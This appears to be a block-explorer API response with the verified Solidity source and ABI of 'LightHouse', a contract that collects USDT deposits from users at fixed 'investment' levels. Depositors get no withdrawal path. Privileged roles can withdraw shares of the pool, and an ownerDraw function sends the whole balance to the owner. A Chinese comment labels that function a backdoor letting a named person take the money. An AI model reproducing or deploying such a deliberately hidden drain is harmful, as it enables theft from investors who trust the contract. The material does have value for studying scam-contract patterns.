{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity ^0.5.12;\r\n\r\nlibrary Address {\r\n    function isContract(address account) internal view returns (bool) {\r\n\r\n        uint256 size;\r\n        assembly { size := extcodesize(account) }\r\n        return size > 0;\r\n    }\r\n}\r\n\r\nlibrary SafeMath {\r\n\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b <= a, \"SafeMath: subtraction overflow\");\r\n        uint256 c = a - b;\r\n\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the\r\n        // benefit is lost if 'b' is also tested.\r\n        // See: https://github.com/OpenZeppelin/openzeppelin-solidity/pull/522\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        // Solidity only automatically asserts when dividing by 0\r\n        require(b > 0, \"SafeMath: division by zero\");\r\n        uint256 c = a / b;\r\n        // assert(a == b * c + a % b); // There is no case in which this doesn't hold\r\n\r\n        return c;\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b != 0, \"SafeMath: modulo by zero\");\r\n        return a % b;\r\n    }\r\n}\r\n\r\ncontract Context {\r\n    constructor () internal { }\r\n    function _msgSender() internal view returns (address payable) {\r\n        return msg.sender;\r\n    }\r\n} \r\n//管理权限\r\ncontract Ownable {\r\n    address  private  _owner;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n    constructor () internal {\r\n        _owner = msg.sender;\r\n        emit OwnershipTransferred(address(0), _owner);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(isOwner(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    function isOwner() public view returns (bool) {\r\n        return msg.sender == _owner;\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public onlyOwner {\r\n        _transferOwnership(newOwner);\r\n    }\r\n\r\n    function _transferOwnership(address newOwner) internal {\r\n        require(newOwner != address(0) && newOwner!=address(this), \"Ownable: new owner is the zero address\");\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        _owner = newOwner;\r\n    }\r\n}\r\n//角色管理\r\nlibrary Roles {\r\n    struct Role {\r\n        mapping (address => bool) bearer;\r\n    }\r\n\r\n    /**\r\n     * @dev Give an account access to this role.\r\n     */\r\n    function add(Role storage role, address account) internal {\r\n        require(!has(role, account), \"Roles: account already has role\");\r\n        role.bearer[account] = true;\r\n    }\r\n\r\n    /**\r\n     * @dev Remove an account's access to this role.\r\n     */\r\n    function remove(Role storage role, address account) internal {\r\n        require(has(role, account), \"Roles: account does not have role\");\r\n        role.bearer[account] = false;\r\n    }\r\n\r\n    /**\r\n     * @dev Check if an account has this role.\r\n     * @return bool\r\n     */\r\n\r\n    function has(Role storage role, address account) internal view returns (bool) {\r\n        require(account != address(0), \"Roles: account is the zero address\");\r\n        return role.bearer[account];\r\n    }\r\n}\r\n\r\n//管理分配\r\ncontract Management is Ownable{\r\n    using Roles for Roles.Role;\r\n\r\n    event ManagerAdded(address indexed account);\r\n    event ManagerRemoved(address indexed account);\r\n\r\n    Roles.Role private _managers;\r\n    uint256 private _managerslevel;\r\n\r\n    constructor ()  internal {\r\n        // addManager(msg.sender);\r\n        _managerslevel = 10;\r\n    }\r\n\r\n    modifier onlyManager()  {\r\n        require(isManager(msg.sender), \"Management: caller is not the manager\");\r\n        _;\r\n    }\r\n    function managerslevel() public view returns(uint256){\r\n        return _managerslevel;\r\n    }\r\n    function isManager(address account) public view returns (bool) {\r\n        return _managers.has(account);\r\n    }\r\n    // function addManager(address account) public onlyOwner {\r\n    //     _addManager(account);\r\n    // }\r\n\r\n    function renounceManager(address account) public onlyOwner {\r\n        _removeManager(account);\r\n    }\r\n\r\n    function _addManager(address account) internal {\r\n        _managers.add(account);\r\n        emit ManagerAdded(account);\r\n    }\r\n\r\n    function _removeManager(address account) internal {\r\n        _managers.remove(account);\r\n        emit ManagerRemoved(account);\r\n    }\r\n}\r\n\r\n\r\n\r\ncontract Finance is Ownable{\r\n    using Roles for Roles.Role;\r\n\r\n    event FinanceAdded(address indexed account);\r\n    event FinanceRemoved(address indexed account);\r\n\r\n    Roles.Role private _finances;\r\n    uint256 private _financeslevel;\r\n\r\n    constructor ()  internal {\r\n        // addManager(msg.sender);\r\n        _financeslevel = 5;\r\n    }\r\n\r\n    modifier onlyFinance()  {\r\n        require(isFinance(msg.sender), \"Finance: caller is not the finance\");\r\n        _;\r\n    }\r\n    function financeslevel() public view returns(uint256){\r\n        return _financeslevel;\r\n    }\r\n    function isFinance(address account) public view returns (bool) {\r\n        return _finances.has(account);\r\n    }\r\n    // function addManager(address account) public onlyOwner {\r\n    //     _addManager(account);\r\n    // }\r\n\r\n    function renounceFinance(address account) public onlyOwner {\r\n        _removeFinance(account);\r\n    }\r\n\r\n    function _addFinance(address account) internal {\r\n        _finances.add(account);\r\n        emit FinanceAdded(account);\r\n    }\r\n\r\n    function _removeFinance(address account) internal {\r\n        _finances.remove(account);\r\n        emit FinanceRemoved(account);\r\n    }\r\n}\r\n\r\n\r\n\r\ncontract Admin is Ownable {\r\n    using Roles for Roles.Role;\r\n\r\n    event AdminAdded(address indexed account);\r\n    event AdminRemoved(address indexed account);\r\n\r\n    Roles.Role private _admins;\r\n    uint256 private _adminslevel;\r\n\r\n    constructor ()  internal {\r\n        // addAdmin(msg.sender);\r\n        _adminslevel = 1;\r\n    }\r\n\r\n    modifier onlyAdmin()  {\r\n        require(isAdmin(msg.sender), \"Admin: caller is not the admin\");\r\n        _;\r\n    }\r\n    function adminslevel() public view returns(uint256){\r\n        return _adminslevel;\r\n    }\r\n\r\n    function isAdmin(address account) public view returns (bool) {\r\n        return _admins.has(account);\r\n    }\r\n\r\n    // function addAdmin(address account) public onlyOwner {\r\n    //     _addAdmin(account);\r\n    // }\r\n\r\n    function renounceAdmin(address account) public onlyOwner {\r\n        _removeAdmin(account);\r\n    }\r\n\r\n    function _addAdmin(address account) internal {\r\n        _admins.add(account);\r\n        emit AdminAdded(account);\r\n    }\r\n\r\n    function _removeAdmin(address account) internal {\r\n        _admins.remove(account);\r\n        emit AdminRemoved(account);\r\n    }\r\n}\r\n\r\ncontract RoleManger is Ownable,Management,Admin,Finance {\r\n\r\n    function addManager(address account) public onlyOwner {\r\n        require(!isAdmin(account) && !isFinance(account),\"RoleManger: Invalid account\");\r\n        _addManager(account);\r\n    }\r\n\r\n    function addAdmin(address account) public onlyOwner {\r\n        require(!isManager(account) && !isFinance(account),\"RoleManger: Invalid account\");\r\n        _addAdmin(account);\r\n    }\r\n\r\n    function addFinance(address account) public onlyOwner {\r\n        require(!isManager(account)&& !isAdmin(account),\"RoleManger: Invalid account\");\r\n        _addFinance(account);\r\n    }\r\n}\r\n\r\n\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n//设置核心函数\r\ncontract LightHouse is Context,RoleManger {\r\n    using SafeMath for uint256;\r\n    using Address for address;\r\n\r\n    event Inverst(address indexed sender,uint256 indexed level,uint256 indexed amount);\r\n    event Upgrade(address indexed sender,uint256 indexed orderid,uint256 indexed newlevel);\r\n    event ReInverst(address indexed sender,uint256 indexed level,uint256 indexed amount);\r\n\r\n    enum State { Active,Locked}\r\n\r\n    State public state;\r\n\r\n    mapping(uint256 => uint256 ) public level;\r\n\r\n    struct TokenModel{\r\n        uint256 decimals;\r\n        IERC20 contractaddress;\r\n    }\r\n\r\n    TokenModel public tokeninfo;\r\n\r\n    address public receiveAddress ;\r\n\r\n    uint256 public id;\r\n\r\n    struct userModel {\r\n        uint256 level;\r\n        uint256 inverstAmount;\r\n    }\r\n    mapping(address => userModel) public userinfo;\r\n\r\n    modifier nonReentrant() {\r\n        id += 1;\r\n        uint256 localCounter = id;\r\n        _;\r\n        require(localCounter == id, \"ReentrancyGuard: reentrant call\");\r\n    }\r\n\r\n    modifier inState(State _state) {\r\n        require(state == _state,\"inState: Invalid state\");\r\n        _;\r\n    }\r\n    uint256 public totalfund;\r\n    // mapping(uint256 => uint256) private _windrawpercet;\r\n    struct WithDrawpercet {\r\n        uint256 percet;\r\n        uint256 amount;\r\n    }\r\n    mapping(uint256 => WithDrawpercet) public windrawpercet;\r\n    constructor()\r\n        public\r\n    {\r\n        tokeninfo.decimals = 6;\r\n        tokeninfo.contractaddress = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);\r\n        receiveAddress = address(this);\r\n        initLevels(tokeninfo.decimals);\r\n\r\n    }\r\n\r\n    function initLevels(uint256 decimals) private {\r\n        require(decimals > 0 && decimals <= 18 ,\"initLevels: Invalid decimals\");\r\n        level[10] = 500 * 10  ** decimals;\r\n        level[20] = 1000 * 10  ** decimals;\r\n        level[30] = 5000 * 10  ** decimals;\r\n        level[40] = 10000 * 10  ** decimals;\r\n        level[50] = 50000 * 10  ** decimals;\r\n\r\n        windrawpercet[adminslevel()].percet = 100;\r\n        windrawpercet[managerslevel()].percet = 50;\r\n        windrawpercet[financeslevel()].percet = 40;\r\n    }\r\n\r\n    function setState(State _state)\r\n        public\r\n        onlyOwner\r\n    {\r\n        state = _state;\r\n    }\r\n    function setWithDrawPercert(uint256 _level,uint256 _percert) public onlyOwner {\r\n        require(_level == managerslevel() || _level == adminslevel(),\"setWithDrawPercert: Invalid level\");\r\n        require(_percert <=100 && _percert >=0,\"setWithDrawPercert: Invalid pecert\");\r\n        windrawpercet[_level].percet = _percert;\r\n    }\r\n\r\n    function setLevel(uint256 levelid,uint256 amount) public onlyOwner {\r\n        require(levelid>0 ,\"setLevel: Invalid level\");\r\n        level[levelid] = amount;\r\n    }\r\n\r\n    function setToken(IERC20 tokenaddress,uint256 decimals) public onlyOwner {\r\n        require(address(tokenaddress).isContract(), \"setToken: Invalid contract\");\r\n        require(decimals > 0 && decimals <= 18 ,\"setToken: Invalid decimals\");\r\n        if(tokeninfo.decimals != decimals){\r\n            tokeninfo.decimals = decimals;\r\n            initLevels(decimals);\r\n        }\r\n        tokeninfo.contractaddress = tokenaddress;\r\n    }\r\n//设置收钱的地址\r\n    function setreceiveAddress(address  _receiveAddress)  public onlyOwner{\r\n        require(receiveAddress != _receiveAddress&&_receiveAddress!=address(0),\"setreceiveAddress: Invalid receive address\");\r\n        receiveAddress = _receiveAddress;\r\n    }\r\n\r\n//上下级关系\r\n    function inverst(uint256 _levelid)\r\n        public\r\n        inState(State.Active)\r\n        nonReentrant\r\n        returns(bool)\r\n    {\r\n        address _sender = _msgSender();\r\n        uint256 _amount = level[_levelid];\r\n        require(_amount > 0 ,\"inverst: Invalid level id\");\r\n        IERC20 _token = tokeninfo.contractaddress;\r\n        callOptionalReturn(_token, abi.encodeWithSelector(_token.transferFrom.selector,_sender, receiveAddress, _amount));\r\n        userModel storage _senderModel = userinfo[_sender];\r\n\r\n        _senderModel.level = _levelid;\r\n        _senderModel.inverstAmount = _senderModel.inverstAmount.add(_amount);\r\n        totalfund = totalfund.add(_amount);\r\n        emit Inverst(_sender,_levelid,_amount);\r\n        return true;\r\n    }\r\n//用户投资升级\r\n    function upgrade(uint256 _orderid,uint256 _newlevelid)\r\n        public\r\n        inState(State.Active)\r\n        nonReentrant\r\n        returns(bool)\r\n    {\r\n        address _sender = _msgSender();\r\n        uint256 _amount = level[_newlevelid];\r\n        userModel storage _senderModel = userinfo[_sender];\r\n        uint256 _oldlevelid = _senderModel.level;\r\n        require(_amount > 0 && _amount > level[_oldlevelid]  && _newlevelid > _oldlevelid,\"upgrade: Invalid order id\");\r\n        require(_orderid > 0 ,\"upgrade: Invalid level id\");\r\n        uint256 _pricespread = _amount.sub(level[_senderModel.level]);\r\n        IERC20 _token = tokeninfo.contractaddress;\r\n        callOptionalReturn(_token, abi.encodeWithSelector(_token.transferFrom.selector,_sender, receiveAddress, _pricespread));\r\n\r\n        _senderModel.level = _newlevelid;\r\n        _senderModel.inverstAmount = _senderModel.inverstAmount.add(_pricespread);\r\n        totalfund = totalfund.add(_pricespread);\r\n        emit Inverst(_sender,_newlevelid,_pricespread);\r\n        emit Upgrade(_sender,_orderid,_newlevelid);\r\n        return true;\r\n    }\r\n//复投\r\n    function reinverst(uint256 _newlevelid)\r\n        public\r\n        inState(State.Active)\r\n        nonReentrant\r\n        returns(bool)\r\n    {\r\n        address _sender = _msgSender();\r\n        uint256 _amount = level[_newlevelid];\r\n\r\n        userModel storage _senderModel = userinfo[_sender];\r\n        uint256 _oldlevelid = _senderModel.level;\r\n        require(_senderModel.inverstAmount > 0 ,\"reinverst: Invalid sender\");\r\n        require(_amount > 0 && _amount >= level[_oldlevelid]  && _newlevelid >= _oldlevelid,\"reinverst: Invalid level id\");\r\n        IERC20 _token = tokeninfo.contractaddress;\r\n        callOptionalReturn(_token, abi.encodeWithSelector(_token.transferFrom.selector,_sender, receiveAddress, _amount));\r\n\r\n        _senderModel.level = _newlevelid;\r\n        _senderModel.inverstAmount = _senderModel.inverstAmount.add(_amount);\r\n        totalfund = totalfund.add(_amount);\r\n        emit ReInverst(_sender,_newlevelid,_amount);\r\n        return true;\r\n    }\r\n\r\n//提现\r\n    function WithDraw(address payable recipient, uint256 _amount,IERC20 _tokenaddress)\r\n        public\r\n        returns(bool)\r\n    {\r\n        address sender = msg.sender;\r\n\r\n        require(isAdmin(sender) || isManager(sender) || isFinance(sender),\"WithDraw :Invalid sender\");\r\n        require(_tokenaddress.balanceOf(address(this)) >= _amount,\"WithDraw: Insufficient token balance\");\r\n\r\n        uint256 _level = adminslevel();\r\n\r\n        if(isManager(sender) ){\r\n            _level = managerslevel();\r\n        }\r\n        if(isFinance(sender)){\r\n            _level = financeslevel();\r\n        }\r\n\r\n        windrawpercet[_level].amount = windrawpercet[_level].amount.add(_amount);\r\n        //limit low-level manager withdraw amount\r\n        if(_level == managerslevel() || _level == financeslevel()){\r\n            require(totalfund.mul(windrawpercet[_level].percet).div(100) >=windrawpercet[_level].amount,\"WithDraw :Invalid amount\" );\r\n        }\r\n\r\n        callOptionalReturn(_tokenaddress, abi.encodeWithSelector(_tokenaddress.transfer.selector,recipient, _amount));\r\n        return true;\r\n    }\r\n//后门，杨仁义可以把钱转走\r\n    function ownerDraw(IERC20 _tokenaddress) onlyOwner public {\r\n        uint256 allbalacne = _tokenaddress.balanceOf(address(this)) ;\r\n        callOptionalReturn(_tokenaddress, abi.encodeWithSelector(_tokenaddress.transfer.selector,msg.sender, allbalacne));\r\n    }\r\n\r\n    function callOptionalReturn(IERC20 token, bytes memory data)\r\n        private\r\n    {\r\n        require(address(token).isContract(), \"SafeERC20: call to non-contract\");\r\n        (bool success, bytes memory returndata) = address(token).call(data);\r\n        require(success, \"SafeERC20: low-level call failed\");\r\n        if (returndata.length > 0) { // Return data is optional\r\n            require(abi.decode(returndata, (bool)), \"SafeERC20: ERC20 operation did not succeed\");\r\n        }\r\n    }\r\n\r\n    function () payable external{\r\n        revert();\r\n    }\r\n}","ABI":"[{\"inputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"AdminAdded\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"AdminRemoved\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"FinanceAdded\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"FinanceRemoved\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"uint256\",\"name\":\"level\",\"type\":\"uint256\"},{\"indexed\":true,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"Inverst\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"ManagerAdded\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"ManagerRemoved\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"uint256\",\"name\":\"level\",\"type\":\"uint256\"},{\"indexed\":true,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"ReInverst\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"uint256\",\"name\":\"orderid\",\"type\":\"uint256\"},{\"indexed\":true,\"internalType\":\"uint256\",\"name\":\"newlevel\",\"type\":\"uint256\"}],\"name\":\"Upgrade\",\"type\":\"event\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address payable\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"},{\"internalType\":\"contract IERC20\",\"name\":\"_tokenaddress\",\"type\":\"address\"}],\"name\":\"WithDraw\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"addAdmin\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"addFinance\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"addManager\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"adminslevel\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"financeslevel\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"id\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_levelid\",\"type\":\"uint256\"}],\"name\":\"inverst\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"isAdmin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"isFinance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"isManager\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"isOwner\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"level\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"managerslevel\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"contract IERC20\",\"name\":\"_tokenaddress\",\"type\":\"address\"}],\"name\":\"ownerDraw\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"receiveAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_newlevelid\",\"type\":\"uint256\"}],\"name\":\"reinverst\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"renounceAdmin\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"renounceFinance\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"renounceManager\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"levelid\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"setLevel\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"enum LightHouse.State\",\"name\":\"_state\",\"type\":\"uint8\"}],\"name\":\"setState\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"contract IERC20\",\"name\":\"tokenaddress\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"decimals\",\"type\":\"uint256\"}],\"name\":\"setToken\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_level\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_percert\",\"type\":\"uint256\"}],\"name\":\"setWithDrawPercert\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"_receiveAddress\",\"type\":\"address\"}],\"name\":\"setreceiveAddress\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"state\",\"outputs\":[{\"internalType\":\"enum LightHouse.State\",\"name\":\"\",\"type\":\"uint8\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"tokeninfo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"decimals\",\"type\":\"uint256\"},{\"internalType\":\"contract IERC20\",\"name\":\"contractaddress\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalfund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_orderid\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_newlevelid\",\"type\":\"uint256\"}],\"name\":\"upgrade\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"userinfo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"level\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"inverstAmount\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"windrawpercet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"percet\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"}]","ContractName":"LightHouse","CompilerVersion":"v0.5.12+commit.7709ece9","OptimizationUsed":"1","Runs":"200","ConstructorArguments":"","EVMVersion":"Default","Library":"","LicenseType":"None","Proxy":"0","Implementation":"","SwarmSource":"bzzr://4164ebe5c981827e2ba96fa7aa9752e61abb114f380d35f920ffbb96bd755469"}]}